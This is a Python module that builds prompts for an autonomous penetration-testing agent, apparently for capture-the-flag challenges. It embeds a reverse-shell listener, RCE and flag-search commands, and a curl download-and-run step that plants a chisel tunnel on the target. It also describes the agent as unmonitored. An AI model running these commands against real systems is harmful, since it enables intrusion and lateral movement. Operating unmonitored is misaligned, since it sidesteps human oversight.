from __future__ import annotations

import json
from typing import Any


def _json(data: Any) -> str:
    return json.dumps(data, ensure_ascii=False, indent=2)


def _build_env_info_section(env_info: str) -> str:
    """Build the sandbox environment info section for the system prompt."""
    if not env_info:
        return "## 沙箱环境\n（环境信息未采集，可运行 `env-info` 获取可用工具和版本信息）"
    # Truncate if too long to avoid bloating context
    if len(env_info) > 4000:
        env_info = env_info[:4000] + "\n... (truncated)"
    return f"## 沙箱环境 (已自动采集)\n以下是沙箱中可用的工具、语言版本和资源，无需再运行 env-info：\n```json\n{env_info}\n```"


def _target_url(target: str) -> str:
    target = target.strip()
    if not target:
        return ""
    if target.startswith(("http://", "https://")):
        return target
    return f"http://{target}"


def _build_memory_section(memory: dict[str, Any]) -> str:
    """Build the memory section text from memory dict."""
    if not (
        memory.get("summary")
        or memory.get("findings")
        or memory.get("leads")
        or memory.get("dead_ends")
        or memory.get("credentials")
        or memory.get("topology")
    ):
        return ""
    parts = []
    if memory.get("summary"):
        parts.append(f"**态势摘要**: {memory['summary']}")
    if memory.get("credentials"):
        parts.append("**已获凭据**: " + " | ".join(str(c) for c in memory["credentials"]))
    if memory.get("findings"):
        findings_str = "\n".join(f"- {f}" for f in memory["findings"][:10])
        parts.append(f"**关键发现**:\n{findings_str}")
    if memory.get("leads"):
        leads_str = "\n".join(f"- {l}" for l in memory["leads"][:5])
        parts.append(f"**待验证路线/下一步**:\n{leads_str}")
    if memory.get("dead_ends"):
        dead_str = " | ".join(str(d) for d in memory["dead_ends"][:5])
        parts.append(f"**⛔ 已排除路径（不要重复尝试）**: {dead_str}")
    if memory.get("topology"):
        topo_str = " | ".join(memory["topology"][:10])
        parts.append(f"**🗺️ 网络拓扑**: {topo_str}")
    return "\n\n".join(parts)


def _build_skills_section(skills: list[dict[str, Any]] | None) -> str:
    if not skills:
        return ""

    parts = [
        "## Enabled Skills",
        (
            "The following mission-selected skills are active. Treat them as "
            "task-specific operating guidance and apply them when relevant."
        ),
    ]
    for skill in skills:
        skill_id = str(skill.get("id") or "").strip()
        name = str(skill.get("name") or skill_id or "unnamed").strip()
        description = str(skill.get("description") or "").strip()
        prompt = str(skill.get("prompt") or "").strip()
        if not prompt:
            continue

        header = f"### {name}"
        if skill_id:
            header += f" (`{skill_id}`)"
        block = [header]
        if description:
            block.append(description)
        block.append(prompt)
        parts.append("\n\n".join(block))

    return "\n\n".join(parts)


def _build_skill_catalog_section(skill_catalog: list[dict[str, Any]] | None) -> str:
    parts = [
        "## Skill Auto-Use Rules",
        (
            "Skills are specialized SKILL.md instructions. Do not load all skills at startup. "
            "Observe the current situation, call `skill_search`, then call `activate_skill` "
            "only when the match is clearly relevant. If the skill is already listed under "
            "Enabled Skills, apply it directly instead of activating it again."
        ),
        (
            "Use `skill_read_reference` only after a skill asks for a bundled reference, "
            "dictionary, template, script, or payload note that is needed for the current step."
        ),
        (
            "Do not rely on hard-coded skill names. Choose skills from the runtime catalog metadata "
            "and the current evidence only. A good skill_search query should include the concrete "
            "signal you observed, such as product/version, protocol, vulnerability class, failing "
            "tool output, file type, authentication/session behavior, or exploitation phase. If "
            "skill_search returns no clear match, continue with normal tools instead of inventing "
            "a skill id."
        ),
    ]

    if skill_catalog:
        lines = ["Available skills catalog (metadata only):"]
        for skill in skill_catalog:
            skill_id = str(skill.get("id") or "").strip()
            description = str(skill.get("description") or "").strip()
            tags = skill.get("tags") or []
            tag_text = ", ".join(str(tag) for tag in tags) if tags else ""
            suffix = f" [tags: {tag_text}]" if tag_text else ""
            lines.append(f"- `{skill_id}`: {description}{suffix}")
        parts.append("\n".join(lines))
    else:
        parts.append("No skills are currently loaded. Continue with the normal tools.")

    return "\n\n".join(parts)


def build_volatile_context(
    *,
    round_no: int,
    memory: dict[str, Any],
    captured_flags: list[str] | None = None,
    expected_flags: int = 1,
    experience_hints: str = "",
) -> str:
    """Build volatile context from the single-layer mission memory plus hints."""
    parts = [f"## Current State\n- Round: {round_no}"]
    flags = captured_flags or []
    if expected_flags > 1:
        if flags:
            remaining = max(0, expected_flags - len(flags))
            parts.append(
                f"- Flags: {len(flags)}/{expected_flags} captured ({', '.join(flags)}); "
                f"{remaining} remaining."
            )
        else:
            parts.append(f"- Flags: 0/{expected_flags} captured; continue after the first flag.")

    memory_section = _build_memory_section(memory)
    parts.append(
        "## Current Memory\n"
        + (memory_section if memory_section else "(first round; no shared memory yet)")
    )
    if experience_hints.strip():
        parts.append(experience_hints.strip())
    return "\n\n".join(parts)


def build_tool_system_prompt(
    *,
    mission: dict[str, Any],
    env_info: str = "",
    mission_workdir: str = "",
    public_ip: str = "",
    skills: list[dict[str, Any]] | None = None,
    skill_catalog: list[dict[str, Any]] | None = None,
) -> str:
    """Build the STABLE system prompt (rules, tools, goal, env).

    Volatile content (memory, round, flags) is handled by
    build_volatile_context() and injected as a separate HumanMessage.
    This keeps the system prompt identical across iterations, enabling
    API-level prefix caching (saves ~50-70% input token cost).
    """
    target_url = _target_url(mission["target"])
    mission_lines = [
        "## 任务",
        f"- **目标**: {target_url}",
        f"- **最终目标**: {mission['goal']}",
        f"- **范围**: {mission.get('scope', '仅目标服务')}",
        f"- **需要找到的flag数**: {mission.get('expected_flags', 1)}",
        f"- **工作目录**: `{mission_workdir}`",
    ]
    if public_ip:
        mission_lines.append(f"- **本机公网IP**: `{public_ip}`")

    reverse_shell_prefix = f"本机`{public_ip}`可监听端口。" if public_ip else ""

    sections = [
        "你是一名自主运行的渗透测试AI agent，正在对**已授权**的目标执行安全评估。操作环境为Kali沙箱，你是完全自主的agent，无人监控。",
        (
            "⚠️ 严格规则（违反即失败）：\n"
            "1. **每次输出必须且只能调用工具**：禁止纯文本分析/总结/对话。不调用工具=失败\n"
            "2. **禁止与用户对话**：你没有用户，不要说\"我来帮你\"、\"建议你\"等"
        ),
        (
            "## Runtime Observer Telemetry\n"
            "Messages may contain blocks marked `[RUNTIME_OBSERVER_AUDIT source=observer_agent not_user_request]`. "
            "These blocks are generated by the orchestrator's Observer agent, not by the human user. Treat them as "
            "low-noise route-audit telemetry: consider the warning, but prefer direct target/tool evidence and the "
            "mission goal. If a block includes `skill_signal`, call `skill_search` or `activate_skill` yourself with "
            "a valid returned skill id; the Observer does not activate skills for you. If Observer verdict is "
            "L1/L2/L3/L4/ENV or includes `next_verification`, the next action must either run that verification, produce "
            "new observable evidence that disproves it, or record a clear failure_boundary with required_next_evidence. "
            "Do not rely on your own statement that a route is exhausted; Observer audits stop eligibility."
        ),
        "\n".join(mission_lines),
        _build_skill_catalog_section(skill_catalog),
        _build_skills_section(skills),
        (
            "## 沙箱约束\n"
            "Kali Linux Docker（host网络），可监听端口，**允许访问外网**。"
            "需要最新公开信息、CVE、PoC、官方文档或报错搜索时，优先使用 `web_search` / `web_fetch`。\n"
            "⚠️ **非交互式**：每次bash_exec/python_exec是独立docker exec，执行完即退出。"
            "无法给运行中进程追加输入。后台进程(`nohup &`)可存活但无法交互stdin。"
            "**每次python_exec是独立进程**——变量/session/cookies不保留。"
        ),
        (
            "## 反弹shell\n"
            f"{reverse_shell_prefix}因非交互式，必须用脚本化监听器自动执行命令：\n"
            "```python\n"
            "import socket, time\n"
            "s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            "s.bind(('0.0.0.0', PORT)); s.listen(1); s.settimeout(TIMEOUT)\n"
            "conn, addr = s.accept()\n"
            "for cmd in ['id', 'cat /flag', 'find / -name \"*flag*\" 2>/dev/null']:\n"
            "    conn.send((cmd + '\\n').encode()); time.sleep(2)\n"
            "    print(f\"[{cmd}] {conn.recv(65536).decode()}\")\n"
            "conn.close(); s.close()\n"
            "```\n"
            "python_exec启动监听，另一次bash_exec触发exploit发反弹shell。**RCE有回显时优先用回显**。"
        ),
        (
            "## 工具\n"
            "- **bash_exec**: Kali bash（200+渗透工具）。首次用某工具先查help\n"
            "- **python_exec**: Python代码（独立进程，不保存状态）\n"
            "- **web_search**: 联网搜索公开网页，用于最新CVE/PoC、官方文档、writeup、报错信息；返回标题、URL、摘要\n"
            "- **web_fetch**: 抓取公开URL并提取正文；优先抓官方公告、NVD、Exploit-DB、GitHub PoC、厂商文档\n"
            "- **knowledge_search**: 离线渗透知识库（2-4个核心关键词）\n"
            "- **search_cve**: CVE/POC库，**产品名+版本号**匹配。例：`search_cve(product=\"thinkphp\", version=\"5.0.23\")`\n"
            "- **skill_search**: 在进入专项流程前检索可用 SKILL.md 元数据\n"
            "- **activate_skill**: 只在命中明确时加载一个相关 skill，并持久化到当前任务\n"
            "- **skill_read_reference**: 仅在已激活 skill 需要引用附带文件时读取\n"
            "- **Runtime Observer**: 被动运行时审核，不是可调用工具；系统会按配置周期注入审计建议\n"
            "- **submit_flag**: 找到flag后立即提交\n"
            "- **give_up**: request Observer stop audit only; stopping is allowed only with failure_boundary, blocked_prerequisite, and required_next_evidence."
        ),
        (
            "## 工具选择速查\n"
            "- **Web发现/参数/漏洞**：目录/接口/虚拟主机用 `ffuf`；隐藏参数用 `arjun`；模板化漏洞/暴露面用 `nuclei`；SQL注入用 `sqlmap`；XSS用 `dalfox`；产品版本漏洞先 `search_cve` / `searchsploit`。\n"
            "- **端口/内网探测**：单目标服务识别用 `nmap -sV -sC`；内网网段快速发现用 `fscan`；发现私网IP后优先结合隧道再访问内网Web。\n"
            "- **SMB/AD枚举**：SMB共享和凭据验证用 `netexec`、`smbmap`；LDAP/域对象用 `ldapdomaindump`、`powerview`；Kerberos用户枚举/喷洒用 `kerbrute`。\n"
            "- **Kerberos/ADCS/Relay**：ASREPRoast用 `asreproast`/`impacket-GetNPUsers`；Kerberoast用 `impacket-GetUserSPNs`；ADCS用 `certipy-ad`；NTLM relay用 `impacket-ntlmrelayx`；强制认证链用 `coercer`、`mitm6`、`PetitPotam`、`printerbug`、`DFSCoerce`、`ShadowCoerce`。\n"
            "- **密码/JWT/凭据**：在线登录爆破用 `hydra`；离线hash/JWT密钥破解用 `hashcat`；JWT结构、篡改和攻击模式用 `jwt_tool`。\n"
            "- **云/容器/K8s**：云配置审计用 `prowler`；镜像/文件系统/依赖/IaC扫描用 `trivy`；Kubernetes暴露面用 `kube-hunter`。\n"
            "- **Windows/后渗透资源**：Windows原生工具在 `/opt/windows-tools`，域内源码/脚本在 `/opt/ad-tools`；有Windows执行条件时再考虑 `mimikatz`、`Rubeus`、`SharpDPAPI`、`SharpHound`、`Certify`、`AdFind`。\n"
            "- **详细语法**：先看自动注入的 `tool_guidance`；仍不确定就运行 `<tool> -h`，或用 `knowledge_search` 查询工具名。"
        ),
        _build_env_info_section(env_info),
        (
            "## Probe command discipline\n"
            "- For independent probes, do not chain everything with `&&`. A timeout on one port/scheme must not prevent later checks.\n"
            "- Prefer labelled blocks with `;` or `|| true`, or split checks into separate tool calls. Example: `echo '[80]'; curl ... || true; echo '[443]'; curl ... || true; echo '[nmap]'; nmap ...`\n"
            "- Use `&&` only for true dependencies such as `cd workdir && mkdir -p evidence && command_that_needs_that_dir`.\n"
            "- When checking HTTP(S), use practical timeouts: `--connect-timeout 5 --max-time 30` for baseline probes, and up to `--max-time 60` for slow challenge ports.\n"
            "- If `curl` returns exit code 28, record it as a timeout signal, then verify with `nc -vz -w3 HOST PORT` or a focused `nmap -Pn -sT -pPORT --reason` before concluding the target is unreachable.\n"
            "- For mixed HTTP/HTTPS/alternate-port checks, report each result separately: status code, server/header hint, body size, and whether a later command was skipped.\n"
            "- Save evidence files even for failures when useful, but keep the terminal output short and labelled so log review can identify the failing probe quickly.\n"
            "- Avoid `tool -h | head -N` for long help output: it can produce SIGPIPE exit 141 under `pipefail`. Prefer `tool -h 2>&1 | sed -n '1,40p' || true`, or write help to a temp file and then `head` the file.\n"
        ),
        "## 输出截断\n工具输出超限时中间被删除只保留首尾。注意截断标记，重要信息可能在尾部。用`head`/`tail`/`grep`精确获取。",
        (
            "## 输出可见性\n"
            "**任何测试必须有可见输出**。优先用bash(curl/wget)获取原始响应。"
            "Python每个关键步骤必须`print()`——状态码、响应体、过滤结果（即使为空）。"
            "遇异常先打印完整raw response再决策：\n"
            "```python\n"
            "r = s.get(url)\n"
            "print(f\"[status] {r.status_code}\")\n"
            "print(f\"[headers] {dict(r.headers)}\")\n"
            "print(f\"[body] {r.text}\")  # 先看原始内容再做过滤\n"
            "```"
        ),
        "## 长耗时命令\n优先短耗时；超30秒的命令：加限制参数（`nmap -F --top-ports 100`、`--max-time 30`）或后台运行（`nohup cmd > /tmp/out.log 2>&1 &`）。工具60s超时。",
        (
            "## 核心原则\n"
            "1. **聚焦攻击面**：充分了解环境后，判断最可能导向flag的功能入口，专注深入，不广撒网\n"
            "2. **漏洞坚持**：发现漏洞迹象后持续深挖；如果连续失败/重复/不确定是否跑偏，回到可观测证据做最小验证；Observer 会按周期被动审核并注入纠偏建议\n"
            "3. **先查资料再攻击**：识别产品+版本→先 `search_cve`，本地无结果或需要最新资料→`web_search`/`web_fetch`；识别漏洞类型→`knowledge_search`；bash可用`searchsploit`。**不要凭记忆构造payload**\n"
            "4. **Session管理**：python_exec无跨调用会话——每次脚本内完成登录→操作。有注册页面直接注册新号。操作cookie前先`Session().get(target)`获取全部cookie，只替换目标cookie保留其余\n"
            "5. **遇阻先调试**：获取原始信息（状态码/响应头/响应体/错误栈），确认问题本质后再决策\n"
            "6. **系统性绕过**：确认过滤机制后，先枚举过滤规则（测哪些字符被拦哪些没），再构造绕过\n"
            "7. **漏洞二次确认**：用产生明确不同输出的第二个payload验证，防确认偏误\n"
            "8. **质疑预设假设**：预期组件搜索不到时，质疑假设本身是否成立\n"
            "9. **禁止伪造flag**：只能提交从目标HTTP响应/文件/数据库/cookie中真实提取的flag\n"
            "10. **跳过无意义扫描**：URL已指定端口时直接访问，不做nmap全端口扫描\n"
            "11. **RCE确认流程**：①`id`或`cat /etc/passwd`测试 ②理解输出通道（盲打/过滤/重定向）③写入webroot或用反弹shell。有回显优先回显，不依赖外部服务\n"
            "12. **flag搜索流程**（RCE后）：`env` → `cat /flag /flag.txt /app/flag` → `find / -maxdepth 3 -name '*flag*' -type f 2>/dev/null` → `grep -r 'flag{{' /app/ /var/www/ /opt/ 2>/dev/null`。flag位置不固定，不要预设\n"
            "13. **区分本地与远程**：`ls`/`cat`看到的是沙箱文件系统，只有curl/requests获取的才是远程目标\n"
            "14. **不完全相信记忆**：记忆可能不完整或误导，实际结果优先\n"
            "15. **上轮影响**：上轮agent可能改变了环境。测试信息固定包含`ENOCH_DEBUG`，不含flag等误导字样\n"
            "16. **内网横向建隧道**：多flag题拿到RCE后发现内网IP时，**第一优先级**建SOCKS隧道：\n"
            "    - 沙箱启动chisel server：`nohup chisel server --reverse --port 9001 &`\n"
            "    - 沙箱起HTTP文件服务暴露工具（参考env中`transferable_tools`）：`cd /usr/bin && python3 -m http.server 9002 &`\n"
            "    - 目标RCE下载chisel：`curl http://PUBLIC_IP:9002/chisel -o /tmp/chisel && chmod +x /tmp/chisel && nohup /tmp/chisel client PUBLIC_IP:9001 R:socks &`\n"
            "    - 配置`echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf`\n"
            "    - `proxychains curl http://INTERNAL_IP:PORT/`\n"
            "    - 备选传输：base64编码传输。备选隧道：`ssh -D 1080 -N user@target` 或 socat端口转发\n"
            "    - ⚠️ 不要在webshell中curl内网IP期望回显——用隧道后在本地proxychains执行才能看到响应\n"
            "    - ⚠️ 传输工具前必须先在沙箱启动文件服务"
        ),
        "# 减少token消耗：精简输出，只输出最有价值的信息，无需冗余总结",
    ]

    return "\n\n".join(section.strip("\n") for section in sections if section)


def build_tool_memory_prompt(
    *,
    mission: dict[str, Any],
    previous_memory: dict[str, Any],
    round_no: int,
    tool_call_log: list[dict[str, Any]],
) -> str:
    """Build memory compression prompt for tool-use architecture."""
    return f"""\
你是 MemoryAgent。你的任务是把本轮工具活动压缩成任务长期记忆。

规则：
- 只保留后续利用、验证和复盘有价值的信息，去重并压缩。
- 所有字段内容必须使用简体中文；字段名保持下方 JSON schema 的英文键名不变。
- summary 是一个简短中文段落，覆盖当前阶段、关键事实和主要阻塞点。
- findings 只记录有工具输出支撑的事实，不写主观猜测。
- leads 记录下一步可验证的具体假设、路线、命令或验证动作。
- dead_ends 说明失败路线以及失败原因，避免重复尝试。
- credentials 只记录已确认的凭据、token 或可复用认证材料。
- topology 只在重要时记录已观察到的网络、服务或依赖关系。
- 不要把本地沙箱行为误写成目标事实。
- 如果没有新增发现，保留已有记忆中仍有价值的内容。
- 返回严格 JSON，第一字符必须是 {{。

任务：
{_json({"target": mission["target"], "goal": mission["goal"], "round_no": round_no})}

上一版记忆：
{_json(previous_memory)}

最近工具调用：
{_json(tool_call_log[-30:])}

返回 JSON：
{{
  "summary": "当前态势中文摘要",
  "findings": ["已验证且可复用的中文事实"],
  "leads": ["下一步可验证的中文假设、路线、命令或验证动作"],
  "dead_ends": ["失败路线和具体原因"],
  "credentials": ["已确认的凭据或 token"],
  "topology": ["10.0.1.1 -> 10.0.1.2 (MySQL:3306)"]
}}
"""


def build_memory_cleaning_prompt(
    *,
    mission: dict[str, Any],
    current_memory: dict[str, Any],
    stall_rounds: int,
) -> str:
    """Build prompt for the memory cleaning agent.

    Invoked when the agent is stuck (stall_rounds >= 3).
    The cleaning agent strips unconfirmed hypotheses from memory while
    preserving objective facts, so the main agent can restart without bias.
    """
    return f"""\
你是记忆清洗 agent。主 agent 已经连续 {stall_rounds} 轮没有新发现，说明它的思路很可能被错误假设误导了。

你的任务是清洗当前记忆，**删除所有未经二次确认的漏洞假设**，只保留客观事实。

## 清洗规则

### 必须保留（客观事实）：
- 目标 URL 和技术栈（如 Flask、Apache、Python 等）
- 已发现的端点列表（URL 路径）
- 已确认的凭据（用户名:密码）
- 页面结构信息（表单、隐藏字段、JavaScript 行为）
- HTTP 响应特征（状态码、响应头中的框架信息）
- 工具可用性信息

### 必须删除（主观假设）：
- 所有"疑似 XXX 漏洞"、"可能存在 XXX 注入"的结论
- leads 中基于某个漏洞假设延伸的测试方向或下一步动作
- 删除所有漏洞判断，哪怕他们已经被证实

### 移入 dead_ends：
- 将被删除的假设精简后简要记录到 dead_ends 中，格式为："[已清洗] XXX - 连续多轮未突破"

## 当前记忆

{_json(current_memory)}

## 任务信息

{_json({"target": mission["target"], "goal": mission["goal"]})}

## 输出要求

返回清洗后的 JSON（第一字符必须是 {{）：
{{
  "summary": "清洗后的态势摘要（只描述客观事实，不包含漏洞假设）",
  "findings": ["只保留客观事实..."],
  "leads": ["基于事实可以尝试的新方向..."],
  "dead_ends": ["原有dead_ends + 被清洗的假设..."],
  "credentials": ["保留所有已确认凭据..."],
  "topology": ["已确认的网络/服务关系..."]
}}
"""
